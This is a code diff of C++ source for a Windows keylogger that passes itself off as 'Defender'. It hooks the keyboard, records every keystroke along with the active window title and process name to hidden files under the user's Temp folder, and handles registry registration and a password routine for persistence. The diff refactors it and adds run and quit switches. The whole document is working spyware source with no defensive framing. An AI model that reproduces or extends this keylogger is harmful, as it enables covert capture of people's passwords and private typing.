@@ -31,7 +31,7 @@ std::ofstream logfile;
 
 std::string HookCode(DWORD code, BOOL caps, BOOL shift)
 {
-	//std::cout << "code=" << code << ",shift=" << shift << ",caps=" << caps << std::endl;
+	//My::mystream << "code=" << code << ",shift=" << shift << ",caps=" << caps << std::endl;
 
 	/*
 	Translate the return code from hook and 
@@ -76,8 +76,8 @@ std::string HookCode(DWORD code, BOOL caps, BOOL shift)
 		// Sleep Key
 		case VK_SLEEP: key = "[SLEEP]"; break;
 		// Num Keyboard 
-		case VK_NUMPAD0:  key = "0"; std::cout << "VK_NUMPAD0" << std::endl; break;
-		case VK_NUMPAD1:  key = "1"; std::cout << "VK_NUMPAD1" << std::endl; break;
+		case VK_NUMPAD0:  key = "0"; break;
+		case VK_NUMPAD1:  key = "1"; break;
 		case VK_NUMPAD2 : key = "2"; break;
 		case VK_NUMPAD3:  key = "3"; break;
 		case VK_NUMPAD4:  key = "4"; break;
@@ -210,18 +210,15 @@ std::string Dayofweek(int code)
 	return name;
 }
 
-class My {
-public:
-	static void Debug(std::string string) {
+	void My::Debug(std::string string) {
 		string += "\n";
 
 		OutputDebugStringA(string.c_str());
-		std::cout << string.c_str();
 		logfile << string.c_str();
 		logfile.flush();
 	}
 
-	static std::string GetProcessFileName(DWORD dwProcId)
+	std::string My::GetProcessFileName(DWORD dwProcId)
 	{
 		CHAR moduleName[2048] = { 0 };
 		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
@@ -231,7 +228,7 @@ public:
 		return std::string(moduleName);
 	}
 
-	static std::string GetWindowFileName(HWND hwnd) {
+	std::string My::GetWindowFileName(HWND hwnd) {
 		DWORD dwProcId = 0;
 		GetWindowThreadProcessId(hwnd, &dwProcId);
 		std::string moduleName = GetProcessFileName(dwProcId);
@@ -241,14 +238,14 @@ public:
 		return std::string("(") + std::to_string(dwProcId) + ") , " + moduleName;
 	}
 	 
-	static bool Test() {
+	bool My::Test() {
 		//GetWindowFileName(GetForegroundWindow());
 
 		//return true;
 		return false;
 	}
 
-	static bool RunProcess(LPSTR lpCmdLine) {
+	bool My::RunProcess(LPSTR lpCmdLine) {
 		if (lstrlenA(lpCmdLine) == 0)
 		{
 			My::Debug("RunProcess: Nothing to run");
@@ -287,7 +284,7 @@ public:
 		return true;
 	}
 		
-	static bool UpdateRegistration(LPSTR lpCmdLine) {
+	bool My::UpdateRegistration(LPSTR lpCmdLine) {
 		DWORD ret;
 		HKEY hkey = NULL;
 
@@ -353,6 +350,18 @@ public:
 				return true;
 			}
 			else
+				if (std::string::npos != cmdLine.find("-run"))
+				{
+					My::DefenderRunCommand();
+					return true;
+				}
+				else
+					if (std::string::npos != cmdLine.find("-quit"))
+					{
+						My::DefenderQuit();
+						return true;
+					}
+					else
 				//if (std::string::npos != cmdLine.find("-unregister"))
 			{
 				std::string strOrgValue;
@@ -379,7 +388,7 @@ public:
 		return false;
 	}
 
-	static bool Service(LPSTR lpCmdLine) {
+	bool My::Service(LPSTR lpCmdLine) {
 		std::string cmdLine(lpCmdLine);
 
 		if (std::string::npos != cmdLine.find("-service"))
@@ -392,7 +401,6 @@ public:
 		return false;
 	}
 
-};
 
 boolean HookKeyboard()
 {
@@ -471,6 +479,8 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 	// Do the wParam and lParam parameters contain information about a keyboard message.
 	if (nCode == HC_ACTION)
 	{
+		std::stringstream debug(std::string(""));
+
 		std::ofstream myfile(fileName, std::ios::out | std::ios::app | std::ios::binary);
 		bool caps = FALSE;		SHORT capsShort = GetKeyState(VK_CAPITAL);
 		std::string outPut;
@@ -485,23 +495,23 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 		// Check for SHIFT key
 		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
 		{
-			//std::cout << "wParam=" << wParam << std::endl;
+			//My::mystream << "wParam=" << wParam << std::endl;
 
 			// WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
 			if (wParam == WM_KEYDOWN)
 			{
-				//std::cout << "shift DOWN" << std::endl;
+				//My::mystream << "shift DOWN" << std::endl;
 				shift = TRUE;
 			}
 			else 
 			if (wParam == WM_KEYUP)
 			{
-				//std::cout << "shift UP" << std::endl;
+				//My::mystream << "shift UP" << std::endl;
 				shift = FALSE;
 			}
 			else
 			{
-				std::cout << "wParam shift UP" << std::endl;
+				debug << "wParam shift UP" << std::endl;
 				shift = FALSE;
 			}
 		}
@@ -553,7 +563,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 
 				HWND hwnd = GetForegroundWindow();
 				int c = GetWindowTextA(hwnd, cWindow, sizeof(cWindow));
-				std::cout << c;
+				debug << c;
 
 				std::string moduleName = My::GetWindowFileName(hwnd);
 
@@ -561,7 +571,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 				temp << " - Current Process: " << moduleName << "\n\n";
 
 				//outPut.append(temp.str());
-				std::cout << temp.str() << std::endl;
+				debug << temp.str() << std::endl;
 				myfile << temp.str() << std::endl;
 				// Setup for next CallBack
 				lastWindow = currentWindow;
@@ -573,7 +583,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 				//outPut.append(HookCode(p->vkCode, caps, shift));
 				temp.clear();
 				temp << HookCode(p->vkCode, caps, shift);
-				std::cout << temp.str();
+				debug << temp.str();
 				myfile << temp.str();
 				if (p->vkCode == VK_RETURN)
 				{
@@ -585,6 +595,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 
 		myfile.close();
 
+		My::Debug(debug.str());
 	}
 	// hook procedure must pass the message *Always*
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -597,6 +608,7 @@ int WinMain(
 	int       nShowCmd
 )
 {
+
 	logfile = std::ofstream(std::string(getenv("LOCALAPPDATA")) + "\\Temp\\logfile.bin", std::ios::out | std::ios::app | std::ios::binary);
 
 	static char szUniqueNamedMutex[] = "com.defender.IsRunning";
@@ -604,9 +616,6 @@ int WinMain(
 	My::Debug(std::string("WinMain: lpCmdLine=") + lpCmdLine + "\n");
 
 	std::string strCmdLine(lpCmdLine);
-	if (strCmdLine.find("Defender") == std::string::npos && strCmdLine.find("Keylogger") == std::string::npos) {
-		My::RunProcess(lpCmdLine);
-	}
 
 	if (My::UpdateRegistration(lpCmdLine))
 	{
@@ -626,7 +635,8 @@ int WinMain(
 
 	PasswordRun(lpCmdLine);
 
-	std::cout << "[*] Starting KeyCapture" << std::endl;
+	My::Debug("WinMain: Starting KeyCapture");
+
 	/*
 	HHOOK WINAPI SetWindowsHookEx(
 	  _In_ int       idHook,
@@ -648,9 +658,10 @@ int WinMain(
 	}
 	else
 	{
-		if (HookKeyboard()) 
+		My::Debug("WinMain: Setting up hook");
+		if (HookKeyboard())
 		{
-			My::Debug("WinMain: Setting up hook");
+			My::DefenderCreateWindow(hInstance);
 
 			logfile.close();
 
